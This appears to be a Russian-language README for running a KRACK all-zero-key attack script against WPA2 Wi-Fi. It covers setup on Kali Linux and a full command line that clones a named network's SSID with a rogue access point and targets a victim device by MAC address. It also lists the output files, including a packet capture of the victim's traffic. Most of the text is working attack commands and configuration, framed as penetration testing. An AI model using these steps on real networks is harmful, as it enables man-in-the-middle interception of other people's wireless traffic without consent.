## Подготовка
* Тестер:
  * Ноутбук
  * Kali Linux 2018.4
  * 2 WIFI сетевые карты
  * 1 Ethernet сетевая карта или 4G - модем, или расшара интернета через мобильный интернет USB - Teathering
  
* Жертва (которая подключается к роутеру):
  * Ноутбук или Смартфон или Планшет с WIFI

* Роутер (точка доступа):

## Предустановка
Установить пакеты Kali Linux:
```
$sudo apt update
$sudo apt install dnsmasq libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome
```
dnsmasq - обязательно установить, иначе интернет не будет работать у жертвы.

Install the following python package:
```
$pip install --user mitm_channel_based
```
Потом отключить аппаратное шифрование на WIFI у тестера **disable hardware encryption** через скрипт ./disable-hwcrypto.sh. Перезагрузиться (обязательно).
 
 ## Использование
 Запустить скрипт
 
 ```
 $sudo ./krackattack/krack_all_zero_tk.py wlan1 wlan0 usb0 "Familia Couto" -t 00:21:5d:ea:fe:be
 ```
 * `wlan1`: интерфейс, на котором слушаем и внедряем пакеты в реальный канал роутера
 * `wlan0`: интерфейс с поддельной базовой станцией
 * `usb0`: интерфейс с интернетом, может быть что угодно, Ethernet например
 * `"Familia Couto"`: SSID станции в роутеры, которую подделываем
 * `-t 00:21:5d:ea:fe:be`: MAC адрес жертвы
 * Другие настройки можно узнать так `./krackattack/krack_all_zero_tk.py -h`!
 
 **Внимание!**
 * Отключить Wi-Fi в диспетчере перед запуском скрипта!
 * После отключения Wi-Fi, запускаем команду: `$rfkill unblock wifi`!
 
 **Вывод**
 
 * `dnsmasq.conf`: конфигурация DHCP и DNS
 * `dnsmasq_log`: вывод dnsmasq
 * `hostapd_rogue.conf`: файл конфигурации поддельной базовой станции
 * `hostapd_rogue.log`: вывод поддельной базовой станции
 * `rogue_ap_capture.pcap`: файл с записанными пакетами, котороые прослушиваются на интерфейсе поддельной базовой станции.
